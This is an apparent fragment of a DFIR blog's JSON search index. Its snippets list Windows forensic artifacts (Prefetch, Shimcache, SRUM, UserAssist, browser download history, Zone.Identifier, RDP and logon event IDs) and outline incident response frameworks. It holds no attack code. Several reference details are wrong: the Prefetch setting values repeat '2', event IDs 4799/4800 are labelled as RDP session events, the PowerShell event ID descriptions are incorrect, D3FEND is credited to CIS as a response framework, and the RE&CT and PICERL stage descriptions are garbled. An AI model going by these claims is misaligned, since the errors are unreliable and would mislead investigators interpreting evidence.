2008+NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDIg32\\LastVisitedPidlMRU The NTUSER.DAT file is unique for each user on the target host.Interpretation and Investigative NotesTracks the application executables used to open files in OpenSaveMRU and the last file path used, for example: Notepad.exe was last run under the C:\\%USERPROFILE%\\Desktop directory.Tools Darkcybe - Registry Explorer ArtiFast Lite 4Sources SANS - OpenSaveMRU and LastVisitedMRU Forensafe - LastVisitedMRUPrefetchIncreases performance of a system by pre-loading code pages of commonly used applications. Cache Manager monitors all files and directories referenced for each application or process and maps them into a .pf file. Utilized to know an application was executed on a system. Limited to 128 files on XP and Windows 7 Limited to 1024 files on Windows 8 &lt;EXE_NAME&gt;-&lt;HASH&gt;.pf Windows XP 7 8 10 11   Server 2003R2 2008R2 2012R2 2016 2019 2022   * * * * *   Although prefetch is available on Windows Servers, it is disabled by default. To enable Prefetch on Windows Servers (I was unable to get this working on Windows Server 2022), the following steps can be taken. However, keep in mind that it will need to be enable prior to any nefarious activities occurring and will not provide retrospective artifacts. Prefetch can also be disabled by default when the system detected an SSD being used, enabling can be configured by the same. Update or create the EnablePrefetcher registry key in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters Set the EnablePrefetcher key value: 0 = Disabled, 1 = Application launch prefetching enabled, 2 = Boot prefetching enabled, 2 = Application launch and boot prefetching enabled. LocationC:\\Windows\\PrefetchInterpretation and Investigative Notes Each .pf file will include last time of execution, number of times run, and device and file handles used by the program. Date/Time file by that name and path was first executed Creation Date of .pf file (-10 seconds) Date/Time file by that name and path was last executed Windows 8+ will contain last 8 times of execution. Tools Darkcybe - PeCmd Windows Prefetch Parser - Requires LicenseSources Geeks for Geeks - Prefetch Files in Windows Microsoft - Disabling/Enabling PrefetchRecentAppsWindows 10 tracked Program execution via the RecentApps registry key for particular versions. Windows XP 7 8 10 11           Only Microsoft Windows 10 versions V1607-1709 appear to populate the RecentApps registry key. Server 2003R2 2008R2 2012R2 2016 2019 2022               LocationNTUSER.DAT\\Software\\Microsoft\\Windows\\Current Version\\Search\\RecentAppsInterpretation and Investigative Notes Each GUID key points to a recent application. AppID = Name of Application LastAccessTime = Last execution time in UTC LaunchCount = Number of times executed Tools Registry Explorer (RECmd)Sources Df-Stream - Recent Apps Think DFIR - When Did RecentApps Go?Shimcache (AppCompatCache)The Shimcache (also known as AppCompatCache) allows applications to call properties from earlier Windows versions, avoiding the need to rewrite an application when the host operating system is upgraded. When an application launches, it checks for compatibility and creates a Shimcache item that maintains the executable’s last modification date, file path, and file size. Windows XP 7 8 10 11   Server 2003R2 2008R2 2012R2 2016 2019 2022   Location# WINDOWS: XPSYSTEM\\CurrentControlSet\\Control\\SessionManager\\AppCompatability# WINDOWS: 7+SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCacheInterpretation and Investigative NotesThis key contains any executable that runs on the Windows system. This key can be used to determine which computers malware or other applications of interest was executed on. Furthermore, depending on the interpretation of time-based data, you may be able to ascertain the last time the system was executed or that activity occurred. Windows XP has a maximum of 96 entries, with the LastUpdateTime field being changed when the executable is run. Windows 7 and later systems have a maximum of 1024 entries., However the LastUpdateTime field does not exist.The registry key itself is not displayed in an easy to read format if utilizing the native regedit.exe tool, therefore parsing with a third party tool is a requirement to analyze the data. Entries do not always indicate execution as they may be shimmed prior to execution when first dropped on disk. Execution should be be proven via multiple methods where able.Tools Darkcybe - Registry Explorer Darkcybe - AppCompatCacheParser AppCompatibilityCache Utility - Requires LicenseSources Chris Menne - Windows Shimcache AnalysisSystem Resource Usage Monitor (SRUM)The System Resource Usage Monitor (SRUM) records 30 to 60 days of historical system performance, including details in support of applications run, user account responsible for each, and application and bytes sent/received per application per hour. A lot of this information assists in populating the ‘App History’ tab on the Task Manager. Windows XP 7 8 10 11       Server 2003R2 2008R2 2012R2 2016 2019 2022             Location# Registry - Artifacts cannot be parsed from the registry locationSOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\SRUM\\Extensions{d10ca2fe-xxxx-xxxx-xxxx-xxxxxxxxxxxx}# FilepathC:\\Windows\\System32\\SRU\\Interpretation and Investigative Notes SRUM Extension GUIDs 973F5D5C-1D90-4944-BE8E-24B94231A174 - Windows Network Data Usage Monitor D10CA2FE-6FCF-4F6D-848E-B2E99266FA86 - Push Notifications (WPN) Provider D10CA2FE-6FCF-4F6D-848E-B2E99266FA89 - Application Resource Usage Provider DD6636C4-8929-4683-974E-22C046A43763 - Windows Network Connectivity Usage Monitor FEE4E14F-02A9-4550-B5CE-5FA2DA202E37 - Energy Usage Provider Tools Darkcybe - SrumECmd Guide SRUM Dump ForensafeSources Velociraptor - Digging Into the System Resource Usage Monitor (SRUM) Forensafe - SRUMUserAssistGUI-based programs launched from the desktop are tracked in the launcher on a windows systemWIN: XP, 7, 8, 10, 11SRV: NULLLocationHKEY_USERS{SID}\\Software\\Microsoft\\Windows\\Currentversion\\Explorer\\UserAssist{GUID}\\CountHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Currentversion\\Explorer\\UserAssist{GUID}\\CountInterpretation and Investigative Notes All values are ROT-13 Encoded .RKR = .exe .YAX = .lnk GUID for XP 75048700 - Active Desktop GUID for Win7/8/10/11 CEBFF5CD - Executable File Execution F4E57C4B - Shortcut File Execution Tools UserAssist View Registry Explorer (RECmd) RECmd - Registry PluginsSources Aldeid - Windows UserAssist Keys Didier Stevens - UserAssistPowerShellThese events can be useful for tracking the use of PowerShell on a device, including the specific cmdlets, scripts, and providers that are being invoked. By analyzing these events, you can get a sense of which users are using PowerShell, and what actions they are performing.WIN: XP, 7, 8, 10, 11SRV: NULLLocationInterpretation and Investigative Notes Event Log Event ID Description Details Recorded PowerShell.evtx 4103 A cmdlet was invoked. The name of the cmdlet, the parameters passed to the cmdlet, and the security identifier (SID) of the user who invoked the cmdlet. PowerShell.evtx 4104 A script was executed. The name and path of the script, the parameters passed to the script, and the security identifier (SID) of the user who executed the script. PowerShell.evtx 4105 A script block was invoked. The script block that was invoked, the parameters passed to the script block, and the security identifier (SID) of the user who invoked the script block. PowerShell.evtx 4106 A provider was loaded. The name of the provider that was loaded, the security identifier (SID) of the user who loaded the provider, and the logon ID. PowerShell.evtx 4107 A provider was unloaded. The name of the provider that was unloaded, the security identifier (SID) of the user who unloaded the provider, and the logon ID. PowerShell.evtx 4108 A provider was invoked. The name of the provider that was invoked, the security identifier (SID) of the user who invoked the provider, and the logon ID. PowerShell.evtx 4109 A provider was refused. The name of the provider that was refused, the security identifier (SID) of the user who attempted to load the provider, and the logon ID. Tools-Sources " }, { "title": "Evidence of Download", "url": "/posts/DFIR_Evidence_of_Download/", "categories": "DFIR, Evidence Artifacts", "tags": "opensavemru, outlook, skype, browser, zone.identifier, alternate data stream", "date": "2022-09-11 00:00:00 +1000", "snippet": "Techniques that can be used to discover evidence in support of program or file download by an attacker post-breach or during an attack.WindowsOpenSaveMRUTracks files that have been opened or saved within a Windows shell dialog box. This happens to be a big data set, not only including web browsers like Internet Explorer and Firefox, but also a majority of commonly used applications.WIN: XP+ SRV: NULLLocation# WINDOWS XPNTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSaveMRU# WINDOWS 7+NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSavePIDIMRUInterpretation and Investigative Notes The * key Tracks the most recent files of any extension input in an OpenSave dialog The .%%% key (Three Letter Extension) Stores the file info from the OpenSave dialog by specific extension Tools Registry Explorer (RECmd)Sources SANS Blog - OpenSaveMRU and LastVisitedMRU Sploited - SANS Forensic Artifact 1 OpenSaveMRUOutlook Email AttachmentsAround 80% of email is stored via attachments and are encoded with MIME/Base64 standard.WIN: XP+ SRV: NULLLocation# WINDOWS XP%USERPROFILE%\\Local\\Settings\\ApplicationData\\Microsoft\\Outlook# WINDOWS 7+%USERPROFILE%\\AppData\\Local\\Microsoft\\OutlookInterpretation and Investigative Notes MS Outlook data file found in these locations include OST and PST files. One should also check the OLK and Content.Outlook folder, which might roam depending on the specific version of Outlook used.Tools OST ViewerSources Microsoft - Introduction to Outlook Data Files (.pst and .ost)Skype HistorySkype history keeps a log of chat sessions and files transferred from one machine to another and is enabled by default.WIN: XP+ SRV: NULLLocation# WINDOWS XPC:\\Documents and Settings&lt;USERNAME&gt;\\Application\\Skype&lt;SKYPE-NAME&gt;# WINDOWS 7+%USERPROFILE%\\AppData\\Roaming\\Skype&lt;SKYPE-NAME&gt;Interpretation and Investigative Notes Each entry will have a date/time value and a Skype username associated with the action The main database file is in SQLite3 format so can be parsed relatively easily.Tools SQLECmd Log2TimeLine - SQLite/Skype ParserSources Acquire Forensics - SkypeBrowser ArtifactsNot directly related to ‘file download’, however can give insight into pages visited which may link to other forensic artifacts such as prefetch etc. More verbose download details can be found int he Browser Download Manager artifactWIN: XP+ SRV: NULLLocation# INTERNET EXPLORER# Version 8/9%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\IEDownloadHistory\\Index.dat# Version 10/11%USERPROFILE%\\AppData\\Local\\Microsoft\\Windows\\WebCache\\WebCacheV*.dat#MOZILLA FIREFOX# Versions 3-25%USERPROFILE%\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles&lt;RANDOM-TEXT&gt;.default\\downloads.sqlite# Versions 26+%USERPROFILE%\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles&lt;RANDOM-TEXT&gt;.default\\places.sqlite -- Table:moz_annos#GOOGLE CHROME%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\HistoryInterpretation and Investigative NotesMany sites in history will list the files that were opened from remote sites and downloaded to the local system. History will record the access to the file on the website that was access via a link.Tools SQLECmd Chromium Parser Mozilla Cache ParserSources Nasbench - Web Browser ForensicsBrowser Download ManagerFirefox and Internet Explorer have built-in download manager applications which keeps a history of every file downloaded by the user. This browser artifact can provide excellent information about what sites a user has been visiting and what finds of files they have been downloading.WIN: XP+ SRV: NULLLocation# INTERNET EXPLORER# Versions 8-9%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\IEDownloadHistory\\# Versions 10-11%USERPROFILE%\\AppData\\Local\\Microsoft\\Windows\\WebCache\\WebCacheV*.dat# MOZILLA FIREFOX# WINDOWS XP%USERPROFILE%\\Application Data\\Mozilla\\Firefox\\Profiles&lt;RANDOM-TEXT&gt;.default\\downloads.sqlite# WINDOWS 7+%USERPROFILE%\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles&lt;RANDOM-TEXT&gt;.default\\downloads.sqliteInterpretation and Investigative NotesDownloads will Include the following data types: Filename, Size, and Type Download from and Referring page File Save Location Application Used to Open File Download Start and End TimersTools SQLECmd Mozilla Cache ParserSources Nasbench - Web Browser ForensicsAlternate Data Stream (ADS) Zone.IdentifierStarting with XP SP2 when files are downloaded from the “Internet Zone” via a browser to an NTFS volume, an alternate data stream is added to the file which is named the Zone Identifier.WIN: XP SP2+ SRV: 2003+LocationC:\\Users&lt;USERNAME&gt;\\Downloads\\C:\\%Path_to_File%Interpretation and Investigative NotesFiles with an ADS Zone.Identifier containing ZoneID=3 were downloaded from the Internet URLZONE_TRUSTED = ZONEID = 2 URLZONE_INTERNET = ZONEID = 3 URLZONE_UNTRUSTED = ZONEID = 4Tools Alternate Stream View PowerShell Get-Content .\\download.exe -Stream Zone.IdentifierSources Microsoft - Known Alternate Stream Names BleepingComputer - Windows Alternate Data Streams Malware Bytes - Introduction to Alternate Data Streams" }, { "title": "Evidence of Account Usage", "url": "/posts/DFIR_Evidence_of_Account_Usage/", "categories": "DFIR, Evidence Artifacts", "tags": "rdp, port:3389, evtx:security, evtx:system, persistence (TA0003), privilege escalation (TA0004)", "date": "2022-09-11 00:00:00 +1000", "snippet": "OverviewForensic evidence of account usage refers to the evidence that can be collected and analyzed to determine who used a particular account, when the account was accessed, and what actions were taken while the account was in use. This type of evidence can be useful in a variety of situations, including investigations into cyber crimes, unauthorized access to systems or data, and employee misconduct.There are several types of forensic evidence that can be used to identify account usage: Log files: Log files, such as system logs, network logs, and application logs, can contain information about who accessed a particular account and when. This information can be analyzed to determine the actions that were taken while the account was in use. System artifacts: System artifacts, such as registry keys, system files, and application data, can contain information about the accounts that have been used on a particular system. This information can be analyzed to determine the actions that were taken while the account was in use. Network traffic: Network traffic, such as packets and traffic logs, can contain information about the accounts that were used to access systems or data over the network. This information can be analyzed to determine the actions that were taken while the account was in use. User artifacts: User artifacts, such as files and documents, can contain information about the accounts that were used to create or modify them. This information can be analyzed to determine the actions that were taken while the account was in use.WindowsLast Login and Last Password ChangeThe “Last Login” and “Last Password Change” artifacts refer to the time stamps that are recorded when a user logs into an account or changes their password. These artifacts can be useful in forensic investigations to determine the usage of an account and to identify any suspicious activity.The “Last Login” artifact is a time stamp that is recorded when a user logs into an account. This artifact can be useful in determining the last time that the account was accessed and can help to identify any suspicious activity.The “Last Password Change” artifact is a time stamp that is recorded when a user changes their password. This artifact can be useful in determining the last time that the password for the account was changed and can help to identify any suspicious activity.WIN: XP+ SRV: NULLLocation# WINDOWS XP+C:\\windows\\System32\\config\\SAMSAM\\Domains\\Account\\UsersInterpretation and Investigative NotesThe System32\\config\\SAM file is a system file that is used to store information about user accounts on a Windows system. This file can be a useful source of forensic evidence in investigations into cyber crimes, unauthorized access to systems or data, and employee misconduct.The SAM file contains several types of forensic evidence that can be useful in investigations, including: User account information: The SAM file contains information about the user accounts that have been created on the system, including the user names, account types, and security identifiers (SIDs). This information can be useful in determining who has accessed the system and what actions they have taken. Hashed passwords: The SAM file contains hashed versions of the passwords for the user accounts. Last login and password change timestamps: The SAM file contains time stamps for the last time that each user account was accessed and the last time that the password was changed. These timestamps can be useful in determining the usage of the accounts and identifying any suspicious activity.Tools Registry Explorer (RECmd) Reg RipperSources Boncaldo Forensics - 4N6 Quick 01 Windows Users List Login CountRemote Desktop Protocol (RDP) Usage - Security.evtxThe security.evtx event log is a system log that is used to record security-related events on a Windows system. This log can contain forensic evidence related to the usage of the Remote Desktop Protocol (RDP), which is a network protocol that allows users to remotely connect to and control another computer.The security.evtx event log can contain several types of forensic evidence related to RDP usage, including: Remote login and logoff events: These events are recorded when a user logs in or logs off of the system using RDP. The log entries may contain information about the user who logged in, the IP address of the remote system, and the date and time of the login or logoff. Remote connection and disconnection events: These events are recorded when a user establishes or terminates an RDP connection to the system. The log entries may contain information about the user who connected, the IP address of the remote system, and the date and time of the connection or disconnection. Remote desktop session events: These events are recorded when a user starts or ends a remote desktop session using RDP. The log entries may contain information about the user who started or ended the session, the IP address of the remote system, and the date and time of the session start or end.WIN: 7+ SRV: 2003+Location%SYSTEM ROOT%\\System32\\winevt\\logs\\Security.evtxInterpretation and Investigative NotesHere is a table listing some event IDs that may be useful for tracking Remote Desktop Protocol (RDP) usage in the security.evtx log: Event ID Description Details Recorded 4624 Remote login User who logged in, IP address of remote system, date and time of login 4634 Remote logoff User who logged off, IP address of remote system, date and time of logoff 4778 Remote connection User who connected, IP address of remote system, date and time of connection 4779 Remote disconnection User who disconnected, IP address of remote system, date and time of disconnection 4799 Remote desktop session start User who started the session, IP address of remote system, date and time of session start 4800 Remote desktop session end User who ended the session, IP address of remote system, date and time of session end Tools Event Log Explorer Event Log Parser (EvtxECmd) Native Event ViewerSources Woshub - RDP Connection Logs Forensics WindowsWindows Service/Process EventsThe system.evtx and security.evtx logs are system logs that are used to record system related events. These logs can contain forensic evidence related to service execution including the user of whom interacted with a service, which can be useful in investigations into cyber crimes, unauthorized access to systems or data, and employee misconduct.The system.evtx and security.evtx logs can contain several types of forensic evidence related to service execution and user names, including: Service start and stop events: These events are recorded when a service is started or stopped on the system. The log entries may contain information about the service that was started or stopped, the user who initiated the action, and the date and time of the event.WIN: 7+ SRV: 2003+Location%SYSTEM ROOT%\\System32\\winevt\\logs\\System.evtx%SYSTEM ROOT%\\System32\\winevt\\logs\\Security.evtxInterpretation and Investigative NotesHere is a table listing some event IDs that may be useful for tracking service and process interaction in the security.evtx and system.evtx logs: Event Log Event ID Description Details Recorded security.evtx 4688 A new process has been created. The name and command line of the process, the security identifier (SID) of the user who created the process, and the logon ID. security.evtx 4697 A service was installed in the system. The name of the service, the display name of the service, the security identifier (SID) of the user who installed the service, and the logon ID. system.evtx 7034 A service terminated unexpectedly. The name of the service, the exit code, and the time the service stopped. Sudden crashing of service can indicate process injection failures. system.evtx 7035 A service was stopped. The name of the service and the time the service stopped. system.evtx 7036 A service was started. The name of the service and the time the service started. system.evtx 7040 The start type of a service was changed. The name of the service, the old start type, and the new start type. Services that are scheduled to start on boot may be indicative of persistence. system.evtx 7045 A service was installed in the system. The name and display name of the service, the name of the account under which the service is running, and the path to the service executable. Tools Event Log Explorer Event Log Parser (EvtxECmd) Native Event ViewerSources Mosse Institute - Digital Forensics - Windows Event LogsAccount InteractionThe security.evtx event log can be a useful source of forensic evidence related to user account interaction.WIN: XP+ SRV: 2003+Location%SYSTEM ROOT%\\System32\\winevt\\logs\\Security.evtxInterpretation and Investigative NotesHere is a table of some useful event IDs for Account interaction in the security.evtx log: Event ID Description Details Recorded 4624 An account was successfully logged on. The security identifier (SID) of the user, the user’s account name and domain, the logon ID, and the logon type (e.g. interactive logon, network logon, etc.). 4625 An account failed to log on. The security identifier (SID) of the user, the user’s account name and domain, the logon ID, and the logon type. 4634 An account was logged off. The security identifier (SID) of the user, the user’s account name and domain, the logon ID, and the logon type. 4647 User initiated logoff. The security identifier (SID) of the user, the user’s account name and domain, the logon ID, and the logon type. 4648 A logon was attempted using explicit credentials. The security identifier (SID) of the user, the user’s account name and domain, the logon ID, and the logon type. 4672 Special privileges assigned to new logon. The security identifier (SID) of the user, the user’s account name and domain, and the logon ID. 4720 A user account was created. The security identifier (SID) of the user, the user’s account name and domain, and the logon ID. The Event ID 4624 also contains logon type codes that are used to classify the type of logon that occurred, and can be helpful in understanding how a user logged on to the device. The details recorded for each logon type may vary, but generally include the security identifier (SID) of the user, the user’s account name and domain, the logon ID, and the logon type. The logon type codes are in the table below: Logon Type Code Logon Type Description 2 Interactive Logon at the console of the local computer. 3 Network Logon through a network. The account used is a normal account. 4 Batch Batch logon. 5 Service Service started by the Service Control Manager. 7 Unlock Unlocking the workstation. 8 NetworkCleartext Network logon with credentials sent in the clear. 9 NewCredentials Network logon with credentials encrypted in the Kerberos ticket. 10 RemoteInteractive Logon to a terminal server. 11 CachedInteractive Cached domain credentials. 12 CachedRemoteInteractive Cached domain credentials for a terminal server. Similar to 10 13 CachedUnlock Unlocking a workstation with cached domain credentials. Similar to 7 Tools Event Log Explorer Event Log Parser (EvtxECmd) Native Event ViewerSources Infosec Institute - Relevance of Windows Event IDs in InvestigationAccount Authentication EventsAuthentication mechanism artifacts, logging details regarding Local Account and Domain authentication. Details are recorded on system that authenticated the credentials (Domain Controller). Local Account = Host Machine Domain Account = Active DirectoryWIN: XP+ SRV: 2003+Location%SYSTEM ROOT%\\System32\\winevt\\logs\\Security.evtxInterpretation and Investigative NotesHere is a table of some useful event IDs for account authentication in the security.evtx log: Event ID Description Details Recorded 4776 The Domain Controller attempted to validate the credentials for an account. The security identifier (SID) of the user, the user’s account name and domain, the logon ID, and the logon type. 4768 A Kerberos authentication ticket (TGT) was requested. The security identifier (SID) of the user, the user’s account name and domain, and the logon ID. 4769 A Kerberos service ticket was requested. The security identifier (SID) of the user, the user’s account name and domain, the name of the service for which the ticket was requested, and the logon ID. 4771 Kerberos pre-authentication failed. The security identifier (SID) of the user, the user’s account name and domain, the type of failure, and the logon ID. Tools Event Log Explorer Event Log Parser (EvtxECmd) Native Event ViewerSources Infosec Institute - Relevance of Windows Event IDs in Investigation" }, { "title": "DFIR Overview", "url": "/posts/DFIR_Overview/", "categories": "DFIR", "tags": "", "date": "2022-09-11 00:00:00 +1000", "snippet": "DFIR OverviewDigital forensics is the process of examining and analyzing digital devices, such as computers, smartphones, and servers, in order to gather and preserve evidence that can be used in a court of law. It involves the use of specialized tools and techniques to extract, analyze, and present digital evidence in a way that is reliable and admissible in legal proceedings.Incident response is the process of identifying, responding to, and managing the aftermath of a security incident or breach. It involves a set of coordinated activities designed to minimize the impact of the incident and restore affected systems and resources to their normal state of operation.In many cases, digital forensics and incident response overlap, as both involve the collection and analysis of digital evidence in order to understand and respond to a security incident. Digital forensics is typically used to investigate the root cause of an incident and to gather evidence that can be used in legal proceedings, while incident response focuses on minimizing the impact of the incident and restoring affected systems and resources.DFIR FrameworksThere are several common incident response frameworks that organizations can use to guide their response to security incidents. These frameworks provide a structured approach to incident response and can help organizations to better understand and manage the various stages of an incident. SANS PICERL: SANS PICERL is a framework developed by the SANS Institute that describes the seven stages of incident response: preparation, identification, containment, eradication, recovery, lessons learned, and post-incident activity. The goal of SANS PICERL is to help organizations to quickly and effectively respond to and recover from security incidents. NIST SP800-61r2: Computer Security Incident Handling Guide: NIST SP 800-61r2 is a framework developed by the National Institute of Standards and Technology (NIST) that describes the process of responding to computer security incidents. It covers the entire incident response lifecycle, from preparing for incidents to post-incident activity. RE&amp;CT framework: The RE&amp;CT (Response, Engage, Analyze, Contain, Terminate) framework is a framework for incident response that is designed to build on top of the NIST framework and the MITRE ATT&amp;CK framework. It provides a detailed and actionable template for incident response techniques, covering the entire incident response lifecycle.These incident response frameworks provide a structured approach to responding to security incidents and can help organizations to better understand and manage the various stages of an incident. They provide guidance on preparing for incidents, detecting and analyzing threats, containing and eradicating incidents, and recovering from incidents. Below are the breakdowns of the individual stages of each framework.SANS PICERL consists of the following seven stages: Preparation: This phase involves planning and preparing for incident response, including developing response plans, training staff, and testing systems. Identification: This phase involves identifying the nature and extent of the incident, including identifying indicators of compromise, analyzing logs and network traffic, and determining the scope and impact of the incident. Containment: This phase involves containing the incident to prevent further damage, including isolating affected systems, blocking access to certain resources, and implementing other containment measures. Eradication: This phase involves removing the threat from the organization’s systems and restoring any damaged or compromised resources. Recovery: This phase involves restoring affected systems and resources to their normal state of operation. Lessons learned: This phase involves reviewing and improving incident response plans and procedures based on the lessons learned from the incident. Post-incident activity: This phase involves conducting post-incident activities, such as reporting and communicating about the incident and conducting forensic analysis to understand the root cause of the incident.NIST SP 800-61r2 covers the following stages: Preparation: This phase involves planning and preparing for incident response, including developing response plans, training staff, and testing systems. Detection: This phase involves detecting and identifying indicators of compromise and determining the scope and impact of the incident. Analysis: This phase involves analyzing the nature and extent of the incident, including analyzing logs and network traffic and identifying the root cause of the incident. Containment: This phase involves containing the incident to prevent further damage, including isolating affected systems, blocking access to certain resources, and implementing other containment measures. Eradication: This phase involves removing the threat from the organization’s systems and restoring any damaged or compromised resources. Recovery: This phase involves restoring affected systems and resources to their normal state of operation. Post-incident activity: This phase involves conducting post-incident activities, such as reporting and communicating about the incident, conducting forensic analysis to understand the root cause of the incident, and reviewing and improving incident response plans and procedures.The RE&amp;CT framework consists of the following five stages: Respond: This phase involves activating the organization’s incident response plan and activating the appropriate response team. It may also involve identifying the nature and scope of the incident, as well as assessing the risk potential. Engage: This phase involves gathering additional information about the incident, including analyzing logs and network traffic and identifying indicators of compromise. It may also involve engaging with other stakeholders, such as law enforcement or external cybersecurity experts. Analyze: This phase involves conducting a detailed analysis of the incident, including identifying the root cause of the incident and any vulnerabilities that were exploited by the attacker. Contain: This phase involves containing the incident to prevent further damage, including isolating affected systems, blocking access to certain resources, and implementing other containment measures. Terminate: This phase involves removing the threat from the organization’s systems and restoring any damaged or compromised resources. It may also involve conducting post-incident activities, such as reporting and communicating about the incident, conducting forensic analysis, and reviewing and improving incident response plans and procedures.Adversarial FrameworksAdversarial frameworks are frameworks that describe the tactics, techniques, and procedures (TTPs) used by attackers to compromise systems and networks. These frameworks can be used to understand the methods and tactics used by adversaries, as well as to identify and defend against potential threats.Some common adversarial frameworks include: MITRE ATT&amp;CK: The MITRE ATT&amp;CK framework is a comprehensive knowledge base of adversarial TTPs, organized by tactics and techniques. It covers the entire attack lifecycle, from initial reconnaissance to post-compromise actions, and is designed to help organizations understand and defend against potential threats. Cyber Kill Chain: The Cyber Kill Chain is a framework developed by Lockheed Martin that describes the seven stages of a cyber attack, from initial reconnaissance to exfiltration of data. It is designed to help organizations to identify and mitigate potential threats at each stage of the attack. D3fend Framework: The D3fend Framework is a framework developed by the Center for Internet Security (CIS) that describes the five stages of incident response: prepare, detect, defend, respond, and recover. It is designed to help organizations to plan and prepare for incident response and to quickly and effectively respond to and recover from incidents. CAPEC (Common Attack Pattern Enumeration and Classification): The CAPEC framework is a comprehensive knowledge base of common attack patterns that can be used to compromise systems and networks. It is developed and maintained by the MITRE Corporation and is designed to help organizations understand and defend against potential threats.Adversarial frameworks like the aforementioned examples can be useful tools for understanding the methods and tactics used by adversaries and for identifying and defending against potential threats. By providing a detailed understanding of adversarial TTPs, these frameworks can help organizations to better protect their systems and networks from potential attacks.Event Vs. IncidentIt is important for organizations to understand fundamental terminology and to be able to correctly categorize events, incidents, and efficacy in order to effectively respond to security threats. Establishing clear definitions and methodologies for these concepts can help organizations to better understand and manage potential threats, as well as to develop effective strategies for responding to and mitigating them.Here are some basic definitions and examples: Events: Events are any activities or occurrences that are recorded by a system or network. These may include normal system activities, such as logins and file access, as well as unusual or suspicious activities that may indicate a potential threat. Incidents: Incidents are events that have the potential to compromise the security of an organization’s systems or networks. These may include cyber attacks, malware infections, or other security breaches. Efficacy: Efficacy refers to the ability of a security measure or control to effectively prevent or mitigate a particular threat. This may be evaluated based on the effectiveness of the measure or control in practice, as well as its cost and any other factors that may impact its use.Event and Incident CategorizationAs a security analyst, it is important to carefully analyze data ingested into a SIEM platform or ticketing system in order to accurately determine the categorization of events and identify potential incidents. This can be a challenging task, as it requires a thorough understanding of security protocols, incident response procedures, and the various types of threats that an organization may face.Here are some steps that a security analyst might take when performing analysis of events: Review and assess the data: The first step in analyzing events is to review and assess the data that has been ingested into the SIEM platform or ticketing system. This may involve reviewing logs, network traffic, or other data sources to identify any unusual or suspicious activities. Determine the nature and scope of the event: Once the data has been reviewed and assessed, the next step is to determine the nature and scope of the event. This may involve identifying the type of event, such as a cyber attack, malware infection, or other security breach, and determining the extent to which the event has impacted the organization’s systems and networks. Assess the risk potential: After the nature and scope of the event has been determined, the security analyst should assess the risk potential of the event. This may involve evaluating the likelihood that the event will result in harm or damage to the organization, as well as the potential impact if it does occur. Determine the appopriate response: Once the nature, scope, and risk potential of the event have been determined, the security analyst should determine the appropriate response. This may involve activating the organization’s incident response plan and activating the appropriate response team, depending on the nature and severity of the event.DFIR GoalsIncident response (IR) and digital forensics are both important tools for addressing and mitigating security threats to an organization’s systems and networks. However, they have different primary goals and focus on different aspects of an incident.IR is primarily focused on answering key questions for an organization’s management team, such as who did what to which systems and how to recover as quickly as possible. This typically involves identifying the nature and scope of the incident, containing the threat to prevent further damage, and restoring affected systems and resources to their normal state of operation.Digital forensics, on the other hand, is focused on providing verbose evidence that can be used by an organization in any law or insurance proceedings arising from the incident. This may involve conducting a detailed analysis of the incident to identify the root cause, collecting and analyzing forensic evidence, and preparing reports and other documentation.During an incident, it is common for both IR and digital forensics to work together in order to achieve the organization’s goals. This allows the incident response team to simplify its objectives into two main categories: responding to the incident and collecting evidence for use in any legal or insurance proceedings. By working together, IR and digital forensics can help organizations to effectively address and mitigate security threats, as well as to protect their interests in the event of any legal or insurance proceedings.DFIR ResponsiblitiesThe key responsibilities of incident response (IR) typically include: Identifying and mitigating security threats: This involves identifying and responding to potential security threats, including cyber attacks, malware infections, and other security breaches. It may involve analyzing logs, network traffic, and other data sources to identify indicators of compromise, as well as implementing containment measures to prevent further damage. Restoring affected systems and resources: After a threat has been identified and contained, IR may be responsible for restoring affected systems and resources to their normal state of operation. This may involve repairing or rebuilding systems, restoring data from backups, and implementing other recovery measures. Communicating with stakeholders: IR may be responsible for communicating with stakeholders, such as management, employees, customers, and law enforcement, about the incident and any necessary actions that need to be taken. Reviewing and improving incident response plans: After an incident has been resolved, IR may be responsible for reviewing and improving the organization’s incident response plans and procedures based on the lessons learned from the incident. This may involve identifying any weaknesses or vulnerabilities that were exploited by the attacker, as well as implementing new controls or procedures to prevent similar incidents from occurring in the future.The key responsibilities of digital forensics professionals typically include: Collecting and preserving digital evidence: Digital forensics professionals are responsible for collecting and preserving digital evidence in a manner that is forensically sound and admissible in a court of law. This may involve using specialized tools and techniques to collect evidence from computers, servers, mobile devices, and other digital systems. Analyzing digital evidence: Digital forensics professionals are responsible for analyzing digital evidence in order to identify and understand the root cause of an incident, as well as any potential suspects or perpetrators. This may involve examining system logs, network traffic, and other digital artifacts to identify patterns and trends that may provide clues about the incident. Preparing reports and other documentation: Digital forensics professionals are responsible for preparing reports and other documentation that detail the findings of their investigations. These reports may be used in criminal or civil cases to provide evidence of cyber crimes or other digital wrongdoing. Providing expert testimony: Digital forensics professionals may be called upon to provide expert testimony in court proceedings in order to explain the technical aspects of their investigations and the relevance of the evidence they have collected.The roles and responsibilities of IR and digital forensics often overlap in the process of addressing and mitigating security threats, and it is common for IR and digital forensics professionals to work together.Some key areas of overlap between the roles and responsibilities of IR and digital forensics include: Collection and preservation of evidence: Both IR and digital forensics professionals are responsible for collecting and preserving evidence in a manner that is forensically sound and admissible in a court of law. This may involve using specialized tools and techniques to collect evidence from computers, servers, mobile devices, and other digital systems. Analysis of evidence: Both IR and digital forensics professionals are responsible for analyzing evidence in order to identify and understand the root cause of an incident, as well as any potential suspects or perpetrators. This may involve examining system logs, network traffic, and other digital artifacts to identify patterns and trends that may provide clues about the incident. Communication and reporting: Both IR and digital forensics professionals are responsible for communicating and reporting on their findings and recommendations. This may involve preparing reports and other documentation, as well as presenting findings to management or other stakeholders.DFIR Analyst SkillsDFIR analysts must have a range of specialized skills in order 